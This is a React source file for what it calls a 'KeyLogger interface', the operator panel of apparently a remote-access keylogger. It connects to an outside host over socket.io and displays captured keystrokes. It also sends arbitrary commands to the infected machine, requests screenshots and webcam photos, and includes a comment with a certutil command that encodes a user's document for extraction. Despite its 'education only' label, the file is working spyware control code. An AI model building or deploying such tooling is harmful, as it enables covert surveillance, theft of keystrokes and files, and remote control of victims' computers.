import React, {Component, useEffect, useState} from "react";
import Helmet from "react-helmet";
import io from "socket.io-client";
import parse from 'html-react-parser';
import Accordion from '@mui/material/Accordion';
import AccordionSummary from '@mui/material/AccordionSummary';
import AccordionDetails from '@mui/material/AccordionDetails';
import Typography from '@mui/material/Typography';
import ExpandMoreIcon from '@mui/icons-material/ExpandMore';

export function Home() {
    const [socket, setSocket] = useState(null)
    const [tabEntre, setTabEntre] = useState([])
    const [commande, setCommande] = useState();
    const [tabCommande, setTabCommande] = useState([])
    const [imageBase64, setImageBase64] = useState()
    const regex = new RegExp(/Aloistescon/g);

    useEffect(() => {
        //setSocket(io("localhost:8080", { transports: ['websocket'] }))
        setSocket(io("aloisguitton.ddns.net:8080", {transports: ['websocket']}))
    }, [])

    useEffect(() => {
        if (socket == null) return
        socket.emit("joinAdmin", "admin")

        socket.on("newMessage", (msg) => {
            setTabEntre(oldArray => [...oldArray, msg]);
        })

        socket.on("commandResult", (res) => {
            let newString = res.replace(/\r?\n/g, ' Aloistescon ')
            setTabCommande([])
            newString.split(" ").map(lettre => {
                setTabCommande(oldArray => [...oldArray, lettre]);
            })
        })

        socket.on("file", (base64) => {
            setImageBase64(base64)
        })

    }, [socket])

    /*
        test commande
        certutil -encode C:\users\Dorian\Pictures\test.docx tmp.b64
        type tmp.b64
    */

    const clearTabEntre = () => {
        setTabEntre([])
    }

    const clearTabCommande = () => {
        setTabCommande([])
    }

    return <>
        <Helmet>
            <title>KeyLogger interface | This website is for education only</title>
            <meta name="description"
                  content="KeyLogger interface | This website is for education only"/>
        </Helmet>
        <div className="container">
            <div className="mb-3" style={{margin: "10px"}}>
                <div className="input-group mb-3">
                    <input type="text" className="form-control"
                           placeholder="Commande"
                           value={commande}
                           onChange={e => setCommande(e.target.value)}
                    />
                    <div className="input-group-append">
                        <button className="btn btn-outline-secondary"
                                type="button"
                                onClick={() => socket.emit("command", commande)}>
                            Lancer
                        </button>
                    </div>
                </div>
            </div>
            <div>
                <Accordion>
                    <AccordionSummary
                        expandIcon={<ExpandMoreIcon/>}
                    >
                        <Typography>Saisi clavier</Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                        <Typography>
                            {tabEntre.map(lettre => {
                                if (lettre === "\\n") return parse("<br />")
                                return lettre
                            })}
                        </Typography>
                        <div className="text-center">
                            <button
                                style={{width: "25%", margin: "10px"}}
                                type="button"
                                className="btn btn-primary"
                                onClick={clearTabEntre}>
                                Nettoyage
                            </button>
                        </div>
                    </AccordionDetails>
                </Accordion>
                <Accordion>
                    <AccordionSummary
                        expandIcon={<ExpandMoreIcon/>}
                    >
                        <Typography>Résultat commande</Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                        <Typography>
                            {tabCommande.map(lettre => {
                                if (regex.test(lettre)) return parse("<br/>")
                                return " " + lettre
                            })}
                        </Typography>
                        <div className="text-center">
                            <button
                                style={{width: "25%", margin: "10px"}}
                                type="button"
                                className="btn btn-primary"
                                onClick={clearTabCommande}>
                                Nettoyage
                            </button>
                        </div>
                    </AccordionDetails>
                </Accordion>
                <Accordion>
                    <AccordionSummary
                        expandIcon={<ExpandMoreIcon/>}
                    >
                        <Typography>Images</Typography>
                    </AccordionSummary>
                    <AccordionDetails>
                        <div className="row text-center">
                            <button
                                style={{margin: "10px"}}
                                type="button"
                                className="btn btn-primary"
                                onClick={() => socket.emit("screenshot")}>
                                Capture d'écran
                            </button>
                            <button
                                style={{margin: "10px"}}
                                type="button"
                                className="btn btn-primary"
                                onClick={() => socket.emit("webcam")}>
                                Photo webcam
                            </button>
                        </div>
                        {
                            imageBase64
                                ? <img style={{maxWidth: "100%"}} src={`data:image/jpeg;base64,${imageBase64}`}/>
                                : null
                        }
                    </AccordionDetails>
                </Accordion>
            </div>
        </div>
        <Typography variant={"body1"} align={"center"} className={"mt-3"}>This website is for education only /-\ made with ❤️</Typography>
    </>
}